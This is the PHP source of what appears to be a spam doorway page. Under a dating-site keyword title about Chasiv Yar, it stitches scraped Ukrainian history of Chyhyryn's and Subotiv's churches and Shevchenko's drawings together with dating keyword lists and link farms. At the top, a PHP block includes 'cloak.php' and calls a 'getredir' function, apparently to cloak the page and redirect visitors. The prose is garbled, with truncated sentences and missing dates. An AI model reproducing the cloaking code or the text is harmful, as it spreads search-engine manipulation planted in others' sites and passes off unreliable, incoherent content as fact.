<?php
if(!@include('cloak.php'))	@include('../cloak.php');
if(function_exists('getredir')){
	@getredir ('api', '%d0%be%d0%b1%d0%bb%d0%b0%d1%81%d1%82%d1%8c+%d1%88%d0%b2%d0%b8%d0%b4%d0%ba%d1%96%d1%81%d0%bd%d0%b8%d1%85+%d0%b7%d0%bd%d0%b0%d0%b9%d0%be%d0%bc%d1%81%d1%82%d0%b2+%d0%a7%d0%b0%d1%81%d1%96%d0%b2+%d0%af%d1%80+%d0%a3%d0%ba%d1%80%d0%b0%d1%97%d0%bd%d0%b0', '2021-05-21', 'pir_210521/UA_dat_geo_trans_ukr', 'ua_dating.txt');
}
?><!doctype html>
<html lang="">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	<title>МШ М. ЧАСІВ ЯР</title>
	<meta name="description" content="Ча́сів Яр — місто в Україні, в Бахмутському районі Донецької області. Орган місцевого самоврядування — Часовоярська міська рада. населення 14 тис" />
	<link rel="canonical" href="https://masage.od.ua/img/106/lalu-oblast-shvidksnih.php" />
<?php if(!@include('../inc1mywp1.php')) @include('inc1mywp1.php'); ?>
						<div id="primary-menu" class="menu"><ul>
<li class="page_item page-item-2"><a href="https://masage.od.ua/img/280/sodaz-gachok-kremenchuk-ukrana.php">гачок Кременчук Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/247/sadeq-znayomstva-dlya.php">знайомства для дорослих Бережани Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/335/neg-sayti-dlya-doroslih.php">сайти для дорослих знайомств Долина Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/280/wudyg-bezkoshtovniy-dodatok.php">безкоштовний додаток для знайомств Васильків Україна</a></li>
</ul></div>
						<div class="main-navigation-bg"></div>
						<div class="clearfix"></div>
					</nav><!-- #site-navigation -->
				</div>
			</div>

		</div>

	</header><!-- #masthead -->



	<div id="content" class="site-content">
	<div class="container"><div class="row"><div class="col-md-7 order-md-3">
	<div id="primary" class="content-area">
		<main id="main" class="site-main main-content-middle">


<article id="post-1" class="post-1 post type-post status-publish format-standard hentry category-uncategorized">
		<header class="entry-header">
		<h1 class="entry-title">Область швидкісних знайомств Часів Яр Україна</h1><!-- .entry-meta -->
			</header><!-- .entry-header -->



	<div class="entry-content">

<p>
<p>Щоб відновлена церква Петра і Павла була максимально наближена до оригіналу, при створенні ескізу було проведено велику роботу над аналізом аналогічних церков того періоду. Науково-проектну документацію розробляв Київський науково-дослідний інститут теорії та історії архітектури й містобудування. Автор проекту Сергій Юрченко. Владика Йоан та Генеральний директор ЗАТ «Міжтериторіальна холдингова компанія «Епос» Іван Миколайович Бездітний заклали під майбутню будівлю металеву капсулу з листом до нащадків, написаним на міді, та наріжний камінь цеглину з давнього підмурку храму.</p>
<p>роки», одним із пунктів якої є реставраційне відтворення церкви святих Петра і Павла в Чигирині. До цієї справи долучилися меценати. Бездітного у році був створений фонд «Нащадки Богдана Хмельницького». До нього увійшли Благодійний фонд соціального розвитку Національного історико-культурного заповідника «Чигирин» генеральний директор Василь Полтавець та Вільне козацтво України отаман Олександр Мазур. На благодійні внески засновників фонду проведено будівельні роботи з відтворення відомої православної святині XVII століття — церкви Петра і Павла.</p>
<p>На сьогоднішній день сучасна відбудова храму, який точно повторює свого попередника, завершена. У нижній частині його планується створити музей «Православні святині Чигиринщини».</p><strong><a id='g1'></a><h2>Часів Яр — Візіком карти</h2></strong><p>На урочистості прибули Святійший Патріарх УПЦ Київського патріархату Філарет, представники обласної державної адміністрації — О. Черевко — голова, завідувач відділу культури та І. Козленко, заслужений будівельник України, генеральний директор холдингової компанії «Епос», президент благодійного фонду «Нащадки Богдана Хмельницького» І. Бездітний, владика, єпископ Черкаський і Чигиринський Йоан, голова Чигиринської Районної держадміністрації П. Литвин, гості зі столиці, обласного центру, інших міст України. Голова облдержадміністрації О. Черевко висловив подяку всім, хто брав участь у будівництві церкви Петра і Павла, і подарував храму ікону Божої Матері, а також вручив почесну грамоту облдержадміністрації І.</p>
<p>Святійший Патріарх Київський і всієї Руси-України вручив церковні нагороди тим, хто найбільше потрудився на спорудженні храму. Так, орденом рівноапостольного князя Володимира нагороджено І. Орден святого Юрія Переможця одержали ряд його сподвижників та колег-будівельників. Медаллю святого Юрія Переможця нагороджено генерального директора НІКЗ «Чигирин» В.</p>
<p>Полтавця, Благословенними грамотами — будівельників та ряд працівників НІКЗ «Чигирин» Бездітний подарував відтвореній церкві ікони Петра і Павла та Юрія Переможця і Євангеліє. Владика Філарет освятив престол нового храму. В рамках заходу відбулися святкова літургія, хресний хід. На сьогодні відтворена церква Петра і Павла є однією із діючих церков Київського патріархату.</p>
<p>Від часу її відкриття священиком був ієрей Володимир Гладковський, який служив також і в Іллінській церкві в Суботові. З січня року у церкві є власний священик протоієрей Василь Циріль. Над автентичними підмурками церкви, що були відкриті в результаті археологічних досліджень, планується зробити накриття. Це дасть змогу зберегти залишки церкви від руйнування та зробить їх доступними для відвідувачів. П зв.</p>
		
	<p>Сказание о населенных местностях Киевской губернии. Дневник — У 2-х т. з книжної української мови, комент. Шевчука; відп. Літопис… — С. Федосова; отв. Київський митрополит… — С. Українське козацьке військо в російсько-турецьких війнах останньої чверті ХVII століття. htm — С. а зламі ХІХ—ХХ століть, коли заходами російського уряду доруйновувалися останні залишки української державності, коли завмирало культурне життя у своїх старих формах і, здавалося, цього разу вже назавжди, якраз тоді серед освічених представників українського громадянства, як антитеза до упадку старого життя, зароджувався новий духовний процес: пробудження інтересу до власного минулого, намагання зберегти національно-історичну традицію.</p>
<p>Розпочався період українського національного відродження1. Саме в цей час пожвавлюється дослідницька робота над літописними та архівними джерелами, що певною мірою проливають світло на події козацької доби. Погляди багатьох істориків фокусуються на історичному минулому колишньої гетьманської столиці Чигирині та родового маєтку Хмельницьких Суботові. У цьому контексті в їхньому полі зору постійно перебуває церква Святого Пророка Іллі в Суботові як усипальниця великого гетьмана.</p>
<p>Показово, що більшість дослідників прагнули побувати на Чигиринщині, напевно, щоб перейнятися духом овіяної легендами землі.</p>
		
			<br><ol>
			
				<li>сайти знайомств в Інтернеті в Кременчук Україна.</li>
			
				<li>найкраще місто для знайомств місто Лисичанськ Україна.</li>
			
				<li>безкоштовні знайомства в Інтернеті Южноукраїнськ Україна.</li>
			
			</ol>
		
	<p>Як правило, їхні ві зити були короткочасними і зводилися до поверхового опису рештків оборонних споруд у Чигирині та Суботові, відвідання існуючих на той час церков та монастирів, зустрічей із старожилами краю задля збирання легенд і переказів. Діяльність їх мала здебільшого збиральницьконакопичувальний характер. На сьогодні ми маємо лише вкрай скупі епізодичні відомості про долю Іллінської церкви впродовж річного періоду після смерті гетьмана. Особливо цінними видаються матеріали молодого тоді українського архівіста Дмитра Бантиша-Каменського. У процесі підготовки першої вітчизняної історії, написаної на основі московських та українських архівів, на початку двадцятих років ХІХ століття він відвідав Суботів, зафіксувавши свої враження у вигляді змістовних лаконічних коментарів: «Я нарочно ездил в Суботово и, к сожалению, тщетно искал в возобновленном храме места, где покоился прах незабвеннаго Хмельницкаго.</p>
<p>Хотя тамошний священник уверял меня, будто малороссияне сохранили останки сего великаго мужа и, вместо его гробницы, выдали полякам другую; но я худо сему верю: нельзя было обмануть, таким образом, мстительного Чарнецкаго, и ужели сии самые малороссияне, или потомки их, не воздвигли-бы себе новаго надгробнаго камня Хмельницкаму, столь много ими любимому!</p>
<p>Бантиш-Каменський уперше охарактеризував церкву як архітектурну споруду: «Суботовская церковь прежде была об одной главе, имеет вид готический; стены оной толщиною в 2 аршина с половиною. А инде и в три. Вышина главнаго фасада 8 сажень; длина церкви 32 аршина; ширина  Прочія стены, по самую крышу, вышиною в 5 сажень…»3. Богданова церква в Суботові. Богданові руїни в Суботові.</p>
<p>Тарас Шевченко малює Богданову церкву в Суботові. Із записок історика випливає, що, напевно, незадовго до його візиту було замінено покрівлю храму, внаслідок чого маківку будівлі доповнили чотирма вежками. БантишКаменський відрядив сюди художника, щоб той замалював святиню. Малюнок П. Сплетссера року, на основі якого наступного року О. Осипов виконав гравюру, став по суті класичним зображенням храму на довгі десятиліття, широко використовувався як ілюстративний матеріал у працях багатьох авторитетних науковців. Не втрачає мистецької та історичної цінності він і тепер. Через брак документальних джерел про храм подальших десятиліть розповідають здебільшого мистецькі твори.</p>
<p>Суттєвим чинником для активізації студій з історії Іллінської церкви стало створення року в Києві урядової Археографічної комісії «Комиссія для разбора древних актов» , метою роботи якої було наукове доведення, що Правобережна Україна не польський, а «русский» край4. ни відрядила на Чигиринщину Т. Зважаючи на вплив результатів цієї експедиції на висвітлення досліджуваної нами проблеми, вважаємо за доцільне детальніше на них спинитися.</p>
<p>Варто зазначити, що цій поїздці передувало короткочасне перебування митця в краї у вересні року. Отримані враження, значно підсилені наступними відвідинами, вилилися у цикл художніх творів, котрі мають пізнавально-історичну цінність і нині.</p><strong><a id='g2'></a><h2>Кафедра легкої атлетики, зимових видів та велосипедного спорту</h2></strong><p>Шевченка стали єдиним взірцем для їх реставрації Свято-Троїцька церква — акварель «Мотрин монастир» , а то й рідкісною згадкою про їх існування акварель «Богданові руїни в Суботові». На думку більшості біографів, Т. Шевченко і під час свого другого візиту до Чигирина, Суботова та Холодного Яру не мав змоги зупинитися тут надовго. На перешкоді був надзвичайно напружений ритм цього періоду його життя. За короткий термін Т. Шевченко зумів зобразити куточки краю, які, очевидно, найбільше його вразили. Як вважають фахівці, один такий малюнок випускник Академії мистецтв міг виконати за півгодини5.</p>
		
			
				<div>Уроки онлайн для 10 класу. Укр. література. Фізика. Історія України. Біологія. Географія - 2 червня</div>
				<div><iframe width='560' height='315' src='https://www.youtube.com/embed/HR_vzDpNgv4' frameborder='0' allowfullscreen></iframe></div>
			
		
	<p>І свідченням цього є не лише високий професіоналізм виконання малюнків. Візьмемо на. себе сміливість припустити, що на акварелі «Богданові руїни в Суботові» на краю схилу в ледь помітній постаті, яка ніби зливається з тлом хмарного неба, митець намалював саме себе. На користь цієї версії виступає і статура чоловіка, і його одяг; та й в руках, напевно, він тримає, аркуш паперу і олівець Візит Т. Шевченка до Суботова був більш, ніж своєчасним. Адже йому поталанило замалювати залишки оборонних споруд незадовго до їх знищення. Контури Іллінської церкви, що бовваніють на задньому плані акварелі, дали змогу дослідникам визначити в майбутньому точне місце розташування однієї із споруд укріплень та відтворити навколишній історичний ландшафт.</p><a id='g3'></a><h3>Навігаційне меню</h3><p>Мистецькі твори Т. Шевченка дають змогу зіставити зовнішній вигляд споруди із зображенням П. Сплетссера двадцятирічної давності. Увагу знову ж таки привертає видозмінений дах церкви, на гребені якого тепер проглядається звичайна маківка. Принагідно зазначимо, що високопрофесійні роботи Т. Шевченка вже півтора століття всіляко використовують у різних сферах освіти, науки , культури.</p><img src="https://tms1.visicom.ua/2.0.0/planet3,ngca/base/12/2478/2683.png" alt="фізичного виховання та спорту України" style="max-width: 480px; max-height: 480px;"/><p>Де ля Фліз. Окрім інших старожитностей Суботова, дослідник відтворив церкву Святого Пророка Іллі6. Треба зауважити, що автор помилково називає цю роботу «Хоры села Субботова церкви выстроенной гетманом Хмельницкимъ». Михайло Грушевський, використовуючи. репродукцію цього твору, підписує його: «На хорах Богданової церкви старий малюнок »9, не вказуючи автора ілюстрації і припускаючись такої самої неточності. Практично всі ці видання висвітлювали історію переважно Правобережної України. У цій книжці, що побачила світ року, знаходимо зворушливі рядки подорожніх вражень дослідника.</p>
<p>Показово, що результати історикоетнографічних студій П. Куліша суттєво відрізняються від розвідок його сучасників тим, що мають не лише описовий, а й аналітичний характер.</p>
</p>
	</div><!-- .entry-content -->

</article><!-- #post-1 -->


		</main><!-- #main -->
	</div><!-- #primary -->


	</div><div class="col-md-2 order-md-1">

	<aside id="secondary" class="widget-area">
			</aside><!-- #secondary -->
</div><div class="col-md-3 order-md-10">
	<aside id="secondary" class="widget-area">
		<section id="search-2" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://masage.od.ua/img/240/qymyj-bezkoshtovn-lesbyanki.php">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
				</label>
				<input type="submit" class="search-submit" value="Search" />
			</form></section>		<section id="recent-posts-2" class="widget widget_recent_entries">		<h2 class="widget-title">Recent Posts</h2>		<ul>
											<li><a href="https://masage.od.ua/img/196/rem-znayomstva-z.php">знайомства з дівчиною Жовті Води Україна</a></li><li><a href="https://masage.od.ua/img/240/bon-znayomstva-dlya-odinokih.php">знайомства для одиноких людей в Красилів Україна</a></li><li><a href="https://masage.od.ua/img/113/vuzil-mzhrasov-znayomstva.php">міжрасові знайомства центральний Лисичанськ Україна</a></li><li><a href="https://masage.od.ua/img/113/mosag-sayti-znayomstv.php">сайти знайомств тануть поруч Васильків Україна</a></li><li><a href="https://masage.od.ua/img/103/xot-sayt-znayomstv.php">сайт знайомств поблизу Балаклія Україна</a></li>
					</ul>
		</section>

			<section id="meta-2" class="widget widget_meta"><h2 class="widget-title">Articles</h2>
				<ol><li><a href='#g1'>Часів Яр — Візіком карти</a></li>
<li><a href='#g2'>Кафедра легкої атлетики, зимових видів та велосипедного спорту</a></li>
<li><a href='#g3'>Навігаційне меню</a></li>
</ol>
			</section>

	</aside><!-- #secondary -->
</div></div></div>	</div>
	<footer id="colophon" class="site-footer">

		<div class="covf-footer-copyright">
			<div class="container">
				<div class="row">
					<div class="col">
						<div class="site-info text-center">
							Powered by 	<a href="https://masage.od.ua/img/422/nodyz-privatn-sluzhbi-znayomstv.php">Covfefe WordPress Theme</a>
						</div>
					</div>
				</div>
			</div>
		</div>
	</footer><!-- #colophon -->
</div><!-- #page -->

<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/jquery.marquee.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/scripts.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/comment-reply.min.js?ver=5.0.3'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/wp-embed.min.js?ver=5.0.3'></script>

</body>
</html>